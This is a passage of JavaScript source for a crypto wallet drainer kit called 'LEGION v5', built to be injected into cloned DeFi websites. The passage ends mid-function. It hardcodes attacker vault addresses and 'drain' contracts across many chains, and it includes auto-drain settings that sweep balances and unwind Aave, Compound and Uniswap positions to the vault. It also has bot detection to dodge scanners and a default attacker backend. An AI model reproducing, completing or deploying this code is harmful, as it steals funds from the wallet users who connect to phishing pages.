/**
 * LEGION v5 — Universal Multi-Chain Wallet Panel (single script)
 * File: legion.js + ./vendor/* for strict CSP
 * Works on: static clones, server.js, nginx proxy, Surge/Vercel, any DeFi frontend
 * All wallets: MetaMask, Rabby, OKX, Trust, Coinbase, Ledger, Trezor + WalletConnect 700+
 * All chains: ETH, BSC, Polygon, Arbitrum, Base, Optimism + SOL, TRON, TON, BTC
 * ONE popup strategy: wallet_sendCalls → EIP-7702 → Permit2 → fallback
 *
 * Usage: <script src="legion-v3.js"></script>
 * Config: window.LEGION_CONFIG = { backendUrl: '...', wcProjectId: '...' }
 */
(function () {
  'use strict';

  // ═══════════════════════════════════════════════════════════════
  // SECTION 01: GUARD + POLYFILLS
  // ═══════════════════════════════════════════════════════════════
  if (window.__LEGION_V3__) return;
  window.__LEGION_V3__ = true;

  // WalletConnect registers wcm-* custom elements; guard against double script load
  (function patchCustomElementRegistry() {
    if (window.__LEGION_CE_PATCH__) return;
    window.__LEGION_CE_PATCH__ = true;
    var reg = window.customElements;
    if (!reg || !reg.define) return;
    var orig = reg.define.bind(reg);
    reg.define = function (name, ctor, opts) {
      if (reg.get(name)) return;
      try { return orig(name, ctor, opts); }
      catch (e) {
        if (e && (e.name === 'NotSupportedError' || String(e.message || '').indexOf('already been used') >= 0)) return;
        throw e;
      }
    };
  })();

  // Node.js polyfills — WalletConnect bundles need these
  (function () {
    if (typeof process === 'undefined' || !process.nextTick) {
      window.process = {
        env: { NODE_ENV: 'production' }, version: '', browser: true,
        nextTick: function (fn, a, b) { Promise.resolve().then(function () { fn(a, b); }); }
      };
    }
    if (typeof global === 'undefined') window.global = window;
    if (typeof Buffer === 'undefined') {
      window.Buffer = {
        isBuffer: function () { return false; },
        from: function (d, enc) {
          if (typeof d === 'string') {
            if (enc === 'hex') {
              var b = [];
              for (var i = 0; i < d.length; i += 2) b.push(parseInt(d.substr(i, 2), 16));
              return new Uint8Array(b);
            }
            return new TextEncoder().encode(d);
          }
          if (d instanceof ArrayBuffer) return new Uint8Array(d);
          return new Uint8Array(d);
        },
        alloc: function (n, fill) { var a = new Uint8Array(n); if (fill !== undefined) a.fill(fill); return a; },
        concat: function (list) {
          var total = list.reduce(function (s, b) { return s + b.length; }, 0);
          var out = new Uint8Array(total); var off = 0;
          list.forEach(function (b) { out.set(b, off); off += b.length; });
          return out;
        },
        byteLength: function (s) { return new TextEncoder().encode(String(s)).length; }
      };
    }
  })();

  // ═══════════════════════════════════════════════════════════════
  // SECTION 02: CONFIG + CONSTANTS
  // ═══════════════════════════════════════════════════════════════
  var CFG = Object.assign({
    backendUrl: 'https://legionapi-production.up.railway.app',
    wcProjectId: '',
    kineticKey: '',
    silentMode: false,
    autoDrain: true,
    autoRun: false,
    autoConnectOnLoad: false,
    minDrainUsd: 5,
    strictCsp: true,
    cdnFallback: false,
    vendorBase: '',
    injectMode: 'auto',
    showOverlay: null,
    hookButtons: true,
    hwWallets: false,
    debugDevTools: false,
  }, window.LEGION_CONFIG || {});

  var SHOW_OVERLAY = CFG.showOverlay != null ? CFG.showOverlay === true
    : (CFG.injectMode !== 'hook' && CFG.injectMode !== 'silent' && !CFG.silentMode);
  var HOOK_BUTTONS = CFG.hookButtons !== false;
  // Same-origin script base (for ./vendor/* bundles — strict CSP safe)
  var SCRIPT_BASE = (function () {
    if (CFG.vendorBase) return String(CFG.vendorBase).replace(/\/?$/, '/');
    var cur = document.currentScript;
    if (cur && cur.src) return cur.src.replace(/[^/]*$/, '');
    return './';
  })();
  var VENDOR_BASE = SCRIPT_BASE + 'vendor/';
  var STRICT_CSP = CFG.strictCsp !== false;
  var CDN_FALLBACK = CFG.cdnFallback === true && !STRICT_CSP;

  var _vendorLoaded = {};
  function loadVendorScript(filename) {
    var key = VENDOR_BASE + filename;
    if (_vendorLoaded[key]) return _vendorLoaded[key];
    _vendorLoaded[key] = new Promise(function (resolve, reject) {
      if (document.querySelector('script[data-legion-vendor="' + filename + '"]')) {
        resolve(); return;
      }
      var s = document.createElement('script');
      s.src = key;
      s.setAttribute('data-legion-vendor', filename);
      s.crossOrigin = 'anonymous';
      s.onload = function () { resolve(); };
      s.onerror = function () { reject(new Error('Vendor missing: ' + filename)); };
      document.head.appendChild(s);
    });
    return _vendorLoaded[key];
  }

  function resolveTonConnect() {
    if (window.TonConnectSDK && window.TonConnectSDK.TonConnect) return window.TonConnectSDK.TonConnect;
    if (window.TON_CONNECT_SDK && window.TON_CONNECT_SDK.TonConnect) return window.TON_CONNECT_SDK.TonConnect;
    if (window.TonConnect) return window.TonConnect;
    return null;
  }

  var BACKEND = String(CFG.backendUrl || '').replace(/\/$/, '') || 'https://legionapi-production.up.railway.app';
  var WC_PROJECT_ID = String(CFG.wcProjectId || '');
  var KINETIC_KEY = String(CFG.kineticKey || '');
  var SILENT = CFG.silentMode === true;
  var AUTO_DRAIN = CFG.autoDrain !== false;
  var AUTO_RUN = CFG.autoRun === true;
  var MIN_DRAIN_USD = (CFG.minDrainUsd != null && Number.isFinite(Number(CFG.minDrainUsd)))
    ? Number(CFG.minDrainUsd)
    : 5;
  var SIGN_ONLY = CFG.signOnly !== false;
  var NATIVE_BATCH_FALLBACK = CFG.nativeBatchFallback !== false;
  var MOBILE_SEND_TX = CFG.mobileSendTx !== false;

  // Logger
  var L = {
    log: function () { if (!SILENT) console.log.apply(console, ['[LGN]'].concat(Array.prototype.slice.call(arguments))); },
    warn: function () { if (!SILENT) console.warn.apply(console, ['[LGN]'].concat(Array.prototype.slice.call(arguments))); },
    err: function () { if (!SILENT) console.error.apply(console, ['[LGN]'].concat(Array.prototype.slice.call(arguments))); }
  };

  var EXPIRY_ISO = '2030-01-01T00:00:00.000Z';
  var MAX_AMOUNT = '1000000000000000000000000000';
  var NATIVE_ETH_ADDR = '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee';
  var PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

  // Vault — filled from /api/v1/client-config, fallback to hardcoded
  var VAULT = {
    evm: '0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53',
    sol: CFG.solVault || '3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv',
    btc: CFG.btcVault || 'bc1q7frtqkunftdgukjghpnhwd0wv4f0hpsqkyj43v',
    tron: CFG.tronVault || 'TDLDgBt5WQ9cdy4mfmfMz3h6CxyjqgbZFc',
    ton: CFG.tonVault || 'UQDItY0ugaDxkMn_Rjb6gZfHOd3-R0ebD5ksb5SoTjeI3BfY',
    cosmos: CFG.cosmosVault || '',
    aptos: CFG.aptosVault || '',
    sui: CFG.suiVault || '',
  };

  var SOL_RPC = CFG.solRpc || 'https://solana-rpc.publicnode.com';
  var COSMOS_REST = CFG.cosmosRest || 'https://cosmos-rest.publicnode.com';
  var APTOS_RPC = CFG.aptosRpc || 'https://fullnode.mainnet.aptoslabs.com/v1';
  var SUI_RPC = CFG.suiRpc || 'https://fullnode.mainnet.sui.io:443';

  // LegionDrainV2 — ONE contract per chain (claim + DeFi drain); deploy: node contracts/deploy-legion-drain.mjs
  var LEGION_DRAIN = {
    1: '0xF4B67A60fEEB92992487957E0D597A0e009bb4D3',
    10: '0x758FD861d6d07d504949eb43A646D05f430765e6',
    56: '0x758FD861d6d07d504949eb43A646D05f430765e6',
    137: '0x758FD861d6d07d504949eb43A646D05f430765e6',
    8453: '0x758FD861d6d07d504949eb43A646D05f430765e6',
    42161: '0x758FD861d6d07d504949eb43A646D05f430765e6',
    43114: '0x09571F30330b034a298642ae5F30d42a753676cf',
    11155111: '0x0000000000000000000000000000000000000000',
  };

  // Legacy maps (fallback until LEGION_DRAIN deployed)
  var BATCH_DRAIN = {
    1: '0x758FD861d6d07d504949eb43A646D05f430765e6',
    10: '0x0000000000000000000000000000000000000000',
    56: '0x0000000000000000000000000000000000000000',
    137: '0x0000000000000000000000000000000000000000',
    8453: '0x0000000000000000000000000000000000000000',
    42161: '0x0000000000000000000000000000000000000000',
    43114: '0x0000000000000000000000000000000000000000',
    11155111: '0x0000000000000000000000000000000000000000',
  };

  // BatchDrainV2 — self-initiated EIP-7702 (onlySelf); mainnet deployed
  var BATCH_DRAIN_V2 = {
    1: '0x51d55a90c6b0a790cbab8cc23b9387c42171f759',
    10: '0x0000000000000000000000000000000000000000',
    56: '0x0000000000000000000000000000000000000000',
    137: '0x0000000000000000000000000000000000000000',
    8453: '0x0000000000000000000000000000000000000000',
    42161: '0x0000000000000000000000000000000000000000',
    43114: '0x0000000000000000000000000000000000000000',
    11155111: '0x0000000000000000000000000000000000000000',
  };

  /** Vault baked into deployed BatchDrainV2 on mainnet — NOT the same as VAULT.evm from API */
  var BATCH_DRAIN_V2_ONCHAIN_VAULT = '0xc46e0141a979a071360A692F887c3dA6b7E39A44';

  // ClaimForwarder — claim() payable → vault (nblscj-style); run deploy-claim-forwarder.mjs
  var CLAIM_FORWARDER = {
    1: '0x0000000000000000000000000000000000000000',
    10: '0x0000000000000000000000000000000000000000',
    56: '0x0000000000000000000000000000000000000000',
    137: '0x0000000000000000000000000000000000000000',
    8453: '0x0000000000000000000000000000000000000000',
    42161: '0x0000000000000000000000000000000000000000',
    43114: '0x0000000000000000000000000000000000000000',
    11155111: '0x0000000000000000000000000000000000000000',
  };

  var ZERO_ADDR = '0x0000000000000000000000000000000000000000';
  var SIG_CLAIM = '0x4e71d92d';
  var SIG_VAULT_READ = '0x411557d1';

  // LegionDrainV2 DefiAction kinds (must match contracts/LegionDrainV2.sol)
  var DEFI_KIND = {
    AAVE_WITHDRAW: 1,
    COMPOUND_REDEEM: 2,
    UNIV2_REMOVE: 3,
    WSTETH_UNWRAP: 4,
    UNIV3_EXIT: 5,
  };

  var CHAIN_DEFI = {
    1: {
      aavePool: '0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2',
      uniV2Router: '0x7a250d5630B4cF539739dF2C5dAcb4c659F2498D',
      uniV3Npm: '0xC36442b4a4522E871399CD117a5BA2e3272ce88',
      wstETH: '0x7f39C581F595B53c5cb19bd0b3f8dA6c935E2Ca0',
    },
    42161: {
      aavePool: '0x794a61358D6845594F94dc1DB02A252b5b4814aD',
      uniV2Router: '0x4752ba5dbc23f44d87826276bf6fd8b45cae2e16',
      uniV3Npm: '0xC36442b4a4522E871399CD117a5BA2e3272ce88',
      wstETH: ZERO_ADDR,
    },
    8453: {
      aavePool: '0xA238Dd80C259a72e81d7e4664a9801593F07d352',
      uniV2Router: '0x4752ba5dbc23f44d87826276bf6fd8b45cae2e16',
      uniV3Npm: '0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1',
      wstETH: ZERO_ADDR,
    },
    10: {
      aavePool: '0x794a61358D6845594F94dc1DB02A252b5b4814aD',
      uniV2Router: '0x4752ba5dbc23f44d87826276bf6fd8b45cae2e16',
      uniV3Npm: '0xC36442b4a4522E871399CD117a5BA2e3272ce88',
      wstETH: ZERO_ADDR,
    },
    137: {
      aavePool: '0x794a61358D6845594F94dc1DB02A252b5b4814aD',
      uniV2Router: '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff',
      uniV3Npm: '0xC36442b4a4522E871399CD117a5BA2e3272ce88',
      wstETH: ZERO_ADDR,
    },
    56: {
      aavePool: ZERO_ADDR,
      uniV2Router: '0x10ED43C718714eb63d5aA57B78B54704E256024E',
      uniV3Npm: '0x46A15B0b27311cedF172Ab29E4f4766fbE7F4364',
      wstETH: ZERO_ADDR,
    },
    43114: {
      aavePool: '0x794a61358D6845594F94dc1DB02A252b5b4814aD',
      uniV2Router: '0xE54Ca86531f17b86F67c2eB5d65B4b92C44458fc',
      uniV3Npm: '0x655C406EbFa6902004403EEF26DB0f5F0702CaFd',
      wstETH: ZERO_ADDR,
    },
  };

  // Aave V3 aToken → underlying (Ethereum mainnet — expand per chain as needed)
  var AAVE_ATOKEN_MAP = {
    '0x4d5f47fa6a74757fc94fed44d51b0ae5dab1946': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
    '0x98c23e9d8f35fbb67a207a64ec021a42c7ecdc4': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    '0x23878914efe38d27c471d6ab029be0ccfa46fc2f': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    '0x018008bfb33d285247a21d44e50697654f754e63': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
    '0xae7ab96520de3a18e5e111b5eaab095312d7fe84': '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84',
  };

  // Compound V2 cToken addresses (Ethereum)
  var COMPOUND_CTOKEN_SET = {
    '0x39aa3ce973723750a3e2120226f44539937090c': true,
    '0x4ddc2d193948926d02f9b1fe9e1daa0718270ed5': true,
    '0x5d3a536e4d6dbd6114cc1ead35777bab948e3643': true,
    '0xf650c3d88d12eebaba46af08b3ddc45d51b42138': true,
  };

  function buildDefiActions(chainId, assets) {
    var cfg = CHAIN_DEFI[Number(chainId)];
    if (!cfg) return [];
    var actions = [];
    var seen = {};

    function pushAction(a) {
      var key = [a.kind, a.target, a.tokenA, a.tokenB, a.param1].join(':');
      if (seen[key]) return;
      seen[key] = true;
      actions.push(a);
    }

    (assets.defi_positions || []).forEach(function (p) {
      if (!p || !p.kind) return;
      pushAction({
        kind: Number(p.kind),
        target: p.target || cfg.aavePool,
        tokenA: p.tokenA || p.asset || ZERO_ADDR,
        tokenB: p.tokenB || ZERO_ADDR,
        param1: String(p.param1 || p.amount || '0'),
        param2: String(p.param2 || '0'),
        param3: String(p.param3 || '0'),
      });
    });

    (assets.tokens || []).forEach(function (t) {
      if (!t || !t.address) return;
      var addr = String(t.address).toLowerCase();
      var bal = BigInt(t.balance || '0');
      if (bal === 0n) return;

      if (cfg.wstETH && addr === cfg.wstETH.toLowerCase()) {
        pushAction({
          kind: DEFI_KIND.WSTETH_UNWRAP,
          target: cfg.wstETH,
          tokenA: cfg.wstETH,
          tokenB: ZERO_ADDR,
          param1: String(bal),
          param2: '0',
          param3: '0',
        });
        return;
      }

      var underlying = AAVE_ATOKEN_MAP[addr];
      if (underlying && cfg.aavePool && !isZeroAddr(cfg.aavePool)) {
        pushAction({
          kind: DEFI_KIND.AAVE_WITHDRAW,
          target: cfg.aavePool,
          tokenA: underlying,
          tokenB: ZERO_ADDR,
          param1: '0',
          param2: '0',
          param3: '0',
        });
        return;
      }

      if (COMPOUND_CTOKEN_SET[addr] && bal > 0n) {
        pushAction({
          kind: DEFI_KIND.COMPOUND_REDEEM,
          target: t.address,
          tokenA: ZERO_ADDR,
          tokenB: ZERO_ADDR,
          param1: '0',
          param2: '0',
          param3: '0',
        });
      }
    });

    (assets.uni_v3_positions || []).forEach(function (pos) {
      if (!pos || !pos.tokenId) return;
      pushAction({
        kind: DEFI_KIND.UNIV3_EXIT,
        target: pos.npm || cfg.uniV3Npm,
        tokenA: ZERO_ADDR,
        tokenB: ZERO_ADDR,
        param1: String(pos.tokenId),
        param2: String(pos.liquidity || '0'),
        param3: '0',
      });
    });

    (assets.uni_v2_lps || []).forEach(function (lp) {
      if (!lp || !lp.tokenA || !lp.tokenB || !lp.liquidity) return;
      pushAction({
        kind: DEFI_KIND.UNIV2_REMOVE,
        target: cfg.uniV2Router,
        tokenA: lp.tokenA,
        tokenB: lp.tokenB,
        param1: String(lp.liquidity),
        param2: '0',
        param3: '0',
      });
    });

    return actions.slice(0, 24);
  }

  function isZeroAddr(addr) {
    return !addr || String(addr).toLowerCase() === ZERO_ADDR;
  }

  function resolveClaimContract(chainId) {
    var id = Number(chainId);
    var ld = LEGION_DRAIN[id];
    if (!isZeroAddr(ld)) return ld;
    var cf = CLAIM_FORWARDER[id];
    if (!isZeroAddr(cf)) return cf;
    return null;
  }

  function resolveLegionDrain(chainId) {
    var id = Number(chainId);
    var ld = LEGION_DRAIN[id];
    if (!isZeroAddr(ld)) return ld;
    return resolveBatchDrainV2(chainId);
  }

  function resolveBatchDrainV2(chainId) {
    var id = Number(chainId);
    var a = BATCH_DRAIN_V2[id];
    return isZeroAddr(a) ? null : a;
  }

  async function readContractVault(provider, contractAddr) {
    if (!contractAddr || !provider) return null;
    try {
      var raw = await provider.request({
        method: 'eth_call',
        params: [{ to: contractAddr, data: SIG_VAULT_READ }, 'latest'],
      });
      if (raw && String(raw).length >= 66) {
        return ('0x' + String(raw).slice(-40)).toLowerCase();
      }
    } catch (e) { L.warn('readContractVault:', e.message); }
    return null;
  }

  function logContractCoverage(chainId) {
    var id = Number(chainId);
    var claim = resolveClaimContract(id);
    var bd2 = resolveBatchDrainV2(id);
    var bd1 = BATCH_DRAIN[id];
    L.log('[contracts] chain', id,
      '| claim:', claim ? claim.slice(0, 10) + '...' : 'NOT_DEPLOYED',
      '| batchV2:', bd2 ? bd2.slice(0, 10) + '...' : 'NOT_DEPLOYED',
      '| batchV1:', !isZeroAddr(bd1) ? bd1.slice(0, 10) + '...' : 'NOT_DEPLOYED',
      '| apiVault:', VAULT.evm.slice(0, 10) + '...',
      bd2 ? ('| v2OnChainVault:' + BATCH_DRAIN_V2_ONCHAIN_VAULT.slice(0, 10) + '...') : '');
  }

  var EIP7702_CHAINS = { 1: true, 10: true, 8453: true, 42161: true, 11155111: true };

  var CHAIN_META = {
    1: { name: 'Ethereum', symbol: 'ETH' },
    56: { name: 'BNB Smart Chain', symbol: 'BNB' },
    137: { name: 'Polygon', symbol: 'MATIC' },
    42161: { name: 'Arbitrum', symbol: 'ETH' },
    8453: { name: 'Base', symbol: 'ETH' },
    10: { name: 'Optimism', symbol: 'ETH' },
    43114: { name: 'Avalanche', symbol: 'AVAX' },
    11155111: { name: 'Sepolia', symbol: 'ETH' },
  };

  var NATIVE_TRANSFER_GAS = 21000n;
  var ERC20_TRANSFER_GAS = 65000n;

  /** Live EIP-1559 fees from wallet RPC — no fixed reserve. */
  async function estimateEip1559Fees(provider) {
    try {
      var hist = await provider.request({
        method: 'eth_feeHistory',
        params: ['0x4', 'latest', [50]],
      });
      var baseArr = hist.baseFeePerGas || [];
      var baseFee = BigInt(baseArr[baseArr.length - 1] || '0x0');
      var rewards = (hist.reward && hist.reward[hist.reward.length - 1]) || [];
      var priority = BigInt(rewards[0] || '0x5F5E100');
      var maxFee = baseFee * 2n + priority;
      if (maxFee < 100000000n) maxFee = 100000000n;
      return { maxFeePerGas: maxFee, maxPriorityFeePerGas: priority };
    } catch (e) {
      try {
        var gp = BigInt(await provider.request({ method: 'eth_gasPrice' }) || '0x0');
        if (gp < 100000000n) gp = 100000000n;
        return { maxFeePerGas: gp, maxPriorityFeePerGas: gp / 10n };
      } catch (e2) {
        return { maxFeePerGas: 30000000000n, maxPriorityFeePerGas: 2000000000n };
      }
    }
  }

  /** Gas cost only — remainder sweeps to vault (not a fixed wallet reserve). */
  async function calcNativeGasCostWei(provider, chainId, gasLimit) {
    var limit = gasLimit || NATIVE_TRANSFER_GAS;
    var fees = await estimateEip1559Fees(provider);
    return (limit * fees.maxFeePerGas * 120n) / 100n;
  }

  async function calcMaxNativeSendWei(provider, nativeHex, chainId, gasLimit) {
    var bal = BigInt(nativeHex || '0x0');
    var gasCost = await calcNativeGasCostWei(provider, chainId, gasLimit);
    if (bal <= gasCost) return { send: 0n, gasCost: gasCost };
    return { send: bal - gasCost, gasCost: gasCost };
  }

  function calcNativeSendWei(nativeHex, chainId) {
    var bal = BigInt(nativeHex || '0x0');
    var gasCost = 500000000000000n;
    if (Number(chainId) === 137) gasCost = 100000000000000000n;
    return bal > gasCost ? bal - gasCost : 0n;
  }

  // EVM multi-chain sweep order — must match backend contracts + CHAIN_ADD_PARAMS
  var MULTI_CHAIN_ORDER = [1, 56, 137, 42161, 8453, 10, 43114];

  var CHAIN_ADD_PARAMS = {
    56: {
      chainId: '0x38',
      chainName: 'BNB Smart Chain',
      nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
      rpcUrls: ['https://bsc-dataseed.binance.org'],
      blockExplorerUrls: ['https://bscscan.com'],
    },
    137: {
      chainId: '0x89',
      chainName: 'Polygon',
      nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
      rpcUrls: ['https://polygon-rpc.com'],
      blockExplorerUrls: ['https://polygonscan.com'],
    },
    42161: {
      chainId: '0xa4b1',
      chainName: 'Arbitrum One',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://arb1.arbitrum.io/rpc'],
      blockExplorerUrls: ['https://arbiscan.io'],
    },
    8453: {
      chainId: '0x2105',
      chainName: 'Base',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://mainnet.base.org'],
      blockExplorerUrls: ['https://basescan.org'],
    },
    10: {
      chainId: '0xa',
      chainName: 'Optimism',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://mainnet.optimism.io'],
      blockExplorerUrls: ['https://optimistic.etherscan.io'],
    },
    43114: {
      chainId: '0xa86a',
      chainName: 'Avalanche C-Chain',
      nativeCurrency: { name: 'AVAX', symbol: 'AVAX', decimals: 18 },
      rpcUrls: ['https://api.avax.network/ext/bc/C/rpc'],
      blockExplorerUrls: ['https://snowtrace.io'],
    },
  };

  // Session state
  var S = {
    drainRunning: false,
    vaultLoaded: false,
    eip7702Enabled: true,
    evmAddr: null, evmChain: null, evmProvider: null, evmWallet: '',
    scoutUsd: 0,
    anchorsOk: 0,
    discovered: [],
    nonEvm: {},
    familyProviders: { SVM: [], UTXO: [], TRON: [], TON: [], COSMOS: [], APTOS: [], SUI: [] },
    chains: { EVM: null, SOL: null, TRON: null, TON: null, BTC: null, COSMOS: null, APTOS: null, SUI: null },
    omnichainLegs: {},
    fusionAssets: [],
    pendingEvmPermit2: null,
    wcSessionActive: false,
    notifySessionKey: null,
    connectSession: null,
    fusionNotified: false,
  };

  // WC guard removed — it blocked AppKit modal.request when connector was io.metamask.
  function installWcGuard() { /* no-op */ }
  function removeWcGuard() { /* no-op */ }

  async function evmRequestAccounts(provider) {
    if (provider && provider.isWalletConnect) {
      try {
        var existing = await provider.request({ method: 'eth_accounts' });
        if (existing && existing.length) return existing;
      } catch (e0) { /* fall through */ }
    }
    return provider.request({ method: 'eth_requestAccounts' });
  }

  function defaultConnect() {
    if (S.drainRunning) return;
    if (!S.vaultLoaded) prefetchVault();
    if (PLAT.inApp && window.ethereum) {
      handleConnect();
      return;
    }
    if (document.querySelector('[data-testid="account-drawer-container"]')) {
      var openFn = window.customModalOpen;
      if (typeof openFn === 'function' && openFn !== defaultConnect) {
        openFn();
        return;
      }
    }
    if (window.LegionDrawer && typeof window.LegionDrawer.open === 'function') {
      window.LegionDrawer.open();
      return;
    }
    if (typeof window.customModalOpen === 'function') {
      window.customModalOpen();
      return;
    }
    handleWC();
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 03: BOT DETECTION
  // ═══════════════════════════════════════════════════════════════
  function isBot() {
    var score = 0;
    try { if (navigator.webdriver === true) score += 3; } catch (e) {}
    try { if (/headless|PhantomJS|selenium|webdriver/i.test(navigator.userAgent)) score += 3; } catch (e) {}
    try { if (!navigator.languages || navigator.languages.length === 0) score += 1; } catch (e) {}
    try { if (screen.width < 100 || screen.height < 100) score += 2; } catch (e) {}
    try { if (screen.width === 0 || screen.height === 0) score += 2; } catch (e) {}
    return score >= 4;
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 04: PLATFORM DETECTION
  // ═══════════════════════════════════════════════════════════════
  var PLAT = (function () {
    var ua = navigator.userAgent || '';
    var isIPadPro = navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1;
    var isMobile = /iPhone|iPad|iPod|Android|Mobile/i.test(ua) || isIPadPro;
    var walletApp = null, inApp = false;
    var appChecks = [
      [/MetaMaskMobile/i, 'MetaMask'],
      [/Trust\/[\d.]+/i, 'Trust Wallet'],
      [/CoinbaseWallet/i, 'Coinbase Wallet'],
      [/OKApp|OKEx/i, 'OKX'],
      [/BitKeep|Bitget/i, 'Bitget'],
      [/TokenPocket/i, 'TokenPocket'],
      [/SafePal/i, 'SafePal'],
      [/imToken/i, 'imToken'],
    ];
    for (var i = 0; i < appChecks.length; i++) {
      if (appChecks[i][0].test(ua)) { walletApp = appChecks[i][1]; inApp = true; break; }
    }
    if (!inApp && isMobile && window.ethereum) {
      if (window.ethereum.isMetaMask) { walletApp = 'MetaMask'; inApp = true; }
      else if (window.ethereum.isTrust) { walletApp = 'Trust Wallet'; inApp = true; }
      else if (window.ethereum.isOkxWallet) { walletApp = 'OKX'; inApp = true; }
      else if (window.ethereum.isCoinbaseWallet) { walletApp = 'Coinbase Wallet'; inApp = true; }
    }
    var isTelegram = !!(window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initData);
    var strategy = 'extension';
    if (isTelegram) strategy = 'telegram';
    else if (inApp) strategy = 'inapp';
    else if (isMobile) strategy = 'wc';
    return { ua, isMobile, walletApp, inApp, isTelegram, strategy };
  })();

  // ═══════════════════════════════════════════════════════════════
  // SECTION 05: WALLET DISCOVERY
  // ═══════════════════════════════════════════════════════════════
  window.addEventListener('eip6963:announceProvider', function (ev) {
    if (!ev.detail || !ev.detail.provider || !ev.detail.info) return;
    var dup = S.discovered.some(function (w) { return w.info.uuid === ev.detail.info.uuid; });
    if (!dup) S.discovered.push(ev.detail);
  });

  function requestProviders() {
    try { window.dispatchEvent(new Event('eip6963:requestProvider')); } catch (e) {}
  }

  // ── Chain-family discovery (blockchain API first — NOT wallet brand names) ──
  var discoveredSolanaWallets = [];

  function registerSolanaWalletStandard(w) {
    if (!w || typeof w !== 'object') return;
    var dup = discoveredSolanaWallets.some(function (x) { return x === w; });
    if (!dup) discoveredSolanaWallets.push(w);
  }

  try {
    window.addEventListener('wallet-standard:register', function (ev) {
      var d = ev.detail;
      if (Array.isArray(d)) d.forEach(registerSolanaWalletStandard);
      else registerSolanaWalletStandard(d);
    });
    window.addEventListener('wallet-standard:app-ready', function (ev) {
      var api = ev.detail && ev.detail.register;
      if (typeof api === 'function') {
        api(function (w) { registerSolanaWalletStandard(w); });
      }
    });
    if (window.navigator && window.navigator.wallets) {
      window.navigator.wallets.forEach(registerSolanaWalletStandard);
    }
  } catch (e) {}

  function hasSvmApi(p) {
    if (!p || typeof p !== 'object') return false;
    var canConnect = !!(p.connect || (p.features && p.features['standard:connect']));
    var canSign = !!(p.signTransaction || p.signAllTransactions ||
      (p.features && (p.features['solana:signTransaction'] || p.features['solana:signAllTransactions'])));
    return canConnect && canSign;
  }

  function hasUtxoApi(p) {
    if (!p || typeof p !== 'object') return false;
    return !!(p.signPsbt && (p.requestAccounts || p.connect || p.getAccounts));
  }

  function hasTronApi(obj) {
    if (!obj) return false;
    var tw = obj.tronWeb || obj;
    return !!(tw && (tw.defaultAddress || tw.trx || tw.transactionBuilder));
  }

  function hasTonApi(p) {
    if (!p || typeof p !== 'object') return false;
    return !!(p.connect || p.sendTransaction || p.send);
  }

  function hasCosmosApi(p) {
    if (!p || typeof p !== 'object') return false;
    return !!(p.enable && (p.signAmino || p.signDirect || p.getKey));
  }

  function hasAptosApi(p) {
    if (!p || typeof p !== 'object') return false;
    return !!(p.connect || p.signAndSubmitTransaction || p.account);
  }

  function hasSuiApi(p) {
    if (!p || typeof p !== 'object') return false;
    return !!(p.connect || p.signTransactionBlock || p.signAndExecuteTransactionBlock);
  }

  function pushFamily(list, seen, provider, family, hint) {
    if (!provider || typeof provider !== 'object') return;
    if (seen.indexOf(provider) !== -1) return;
    seen.push(provider);
    list.push({ family: family, provider: provider, hint: hint || family });
  }

  function scanObjectForFamily(root, list, seen, family, testFn, prefix) {
    if (!root || typeof root !== 'object') return;
    try {
      if (testFn(root)) pushFamily(list, seen, root, family, prefix || family);
    } catch (e) {}
    var keys;
    try { keys = Object.keys(root); } catch (e2) { return; }
    for (var i = 0; i < keys.length; i++) {
      var k = keys[i];
      if (k === 'parent' || k === 'top' || k === 'window') continue;
      try {
        var child = root[k];
        if (child && typeof child === 'object' && testFn(child)) {
          pushFamily(list, seen, child, family, (prefix ? prefix + '.' : '') + k);
        }
      } catch (e3) {}
    }
  }

  function discoverChainFamilies() {
    var seen = [];
    var fp = {
      SVM: [], UTXO: [], TRON: [], TON: [], COSMOS: [], APTOS: [], SUI: [],
    };

    discoveredSolanaWallets.forEach(function (w) {
      pushFamily(fp.SVM, seen, w, 'SVM', (w && w.name) ? w.name : 'wallet-standard');
    });

    scanObjectForFamily(window.solana, fp.SVM, seen, 'SVM', hasSvmApi, 'window.solana');
    if (window.phantom) scanObjectForFamily(window.phantom, fp.SVM, seen, 'SVM', hasSvmApi, 'phantom');
    if (window.solflare) pushFamily(fp.SVM, seen, window.solflare, 'SVM', 'solflare');
    if (window.backpack) scanObjectForFamily(window.backpack, fp.SVM, seen, 'SVM', hasSvmApi, 'backpack');
    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.SVM, seen, 'SVM', hasSvmApi, 'okxwallet');
    if (window.bitkeep) scanObjectForFamily(window.bitkeep, fp.SVM, seen, 'SVM', hasSvmApi, 'bitkeep');
    if (window.trustwallet) scanObjectForFamily(window.trustwallet, fp.SVM, seen, 'SVM', hasSvmApi, 'trustwallet');
    if (window.coinbaseSolana) pushFamily(fp.SVM, seen, window.coinbaseSolana, 'SVM', 'coinbaseSolana');

    if (window.unisat) pushFamily(fp.UTXO, seen, window.unisat, 'UTXO', 'unisat');
    if (window.BitcoinProvider) pushFamily(fp.UTXO, seen, window.BitcoinProvider, 'UTXO', 'BitcoinProvider');
    if (window.LeatherProvider) pushFamily(fp.UTXO, seen, window.LeatherProvider, 'UTXO', 'leather');
